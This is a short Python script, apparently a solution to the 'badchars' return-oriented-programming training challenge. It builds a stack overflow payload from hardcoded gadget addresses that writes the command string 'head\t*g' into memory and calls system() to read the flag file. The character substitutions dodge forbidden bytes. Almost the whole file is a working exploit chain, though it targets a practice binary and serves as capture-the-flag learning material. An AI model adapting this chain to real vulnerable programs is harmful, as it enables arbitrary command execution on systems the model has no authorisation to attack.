#!/usr/bin/env python3
# badcharsrop
# pipe to stdin

import struct
import sys


def pack(a):
    return struct.pack("<Q", a)


A = b'A' * 8
buf = pack(0x6010f0)
system = pack(0x4006f0)
pop_di = pack(0x400b39)
payload = b'head\t*g\x00'
pop_12_13 = pack(0x400b3b)
mov_qw13_12 = pack(0x400b34)
exit = pack(0x400934)

sys.stdout.buffer.write(A * 5 + pop_12_13 + payload + buf + mov_qw13_12 + pop_di + buf + system + exit)
